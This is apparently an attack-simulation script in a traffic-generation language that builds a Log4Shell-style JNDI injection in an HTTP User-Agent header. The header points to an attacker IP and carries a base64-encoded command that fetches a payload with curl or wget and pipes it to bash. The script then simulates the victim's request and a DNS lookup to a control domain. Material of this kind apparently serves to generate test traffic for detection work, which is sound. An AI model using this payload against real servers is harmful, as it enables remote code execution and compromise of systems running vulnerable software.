av 1

$attacker-ip = "45.155.205.233" # Russia
$attacker-port = "5874"

$victim-ip = "93.184.216.34" # example.com
$victim-port = "80"

$control-domain = "8ceb726f0b75.bingsearchlib.com"
$control-ip = "75.76.121.218" # ip.gethostbyname("8ceb726f0b75.bingsearchlib.com")

#$ip-src = "93.184.216.34" # ip.gethostbyname("www.example.com")

$cmd = base64.encode(s"""(curl -s ${attacker-ip}:${attacker-port}/${victim-ip}:${victim-port}||wget -q -O- ${attacker-ip}:${attacker-port}/${victim-ip}:${victim-port})|bash""")
$user-agent-prefix = """${jndi:"""
$user-agent = "${user-agent-prefix}ldap://${attacker-ip}:${attacker-port}/Basic/Command/Base64/${cmd}}"

message "Attacker User Agent: ${user-agent}"

$ip-src = $attacker-ip
$port-src = $attacker-port
$ip-dst = $victim-ip
$port-dst = $victim-port
$domain = "www.example.com"
action http {
    $uri = "/"
    
    exec HTTPConnection
}

delete $port-src
delete $port-dst

$ip-src = $victim-ip
$ip-dst = $control-ip
$domain = $control-domain
action dns {   
    exec DNSConnection
}

delete $user-agent

action http {
    
    exec HTTPConnection
}
